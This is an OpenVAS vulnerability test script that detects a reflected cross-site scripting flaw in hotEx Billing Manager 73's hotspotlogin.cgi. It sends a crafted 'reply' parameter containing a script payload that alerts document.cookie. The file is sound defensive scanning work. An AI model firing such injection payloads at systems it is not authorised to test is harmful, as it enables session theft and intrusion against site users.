###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hotex_billing_manager_xss_vuln.nasl 2015-04-27 10:13:24 +0530 Apr$
#
# hotEx Billing Manager Multiple Vulnerabilities
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805371");
  script_version("$Revision: 11424 $");
  script_cve_id("CVE-2015-3319", "CVE-2015-2781");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-04-27 10:13:24 +0530 (Mon, 27 Apr 2015)");
  script_name("hotEx Billing Manager Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with Hotspot Express
  hotEx Billing Manager and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - Input passed via the 'reply' parameter to 'hotspotlogin.cgi' is
    not properly sanitised before being returned to the user.

  - HTTPOnly flag is not included in Set-Cookie header, which makes
    it easier for remote attackers to obtain potentially sensitive
    information via script access to this cookie");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site.");

  script_tag(name:"affected", value:"hotEx Billing Manager version 73");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Apr/18");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/535186/100/0/threaded");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131297/HotExBilling-Manager-73-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  url = dir + "/hotspotlogin.cgi?res=failed&reply=1";

  sndReq = http_get(item:url,  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if("> Login<" >< rcvRes && "hotspot_popup" >< rcvRes)
  {
    url = '/cgi-bin/hotspotlogin.cgi?res=failed&reply='+
          '<script>alert%28document.cookie%29<%2fscript>'+
          '%2c%20Invalid%20username%20or%20Password';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"_script_alert\(document\.cookie\)_/script_",
       extra_check:"> Login<"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
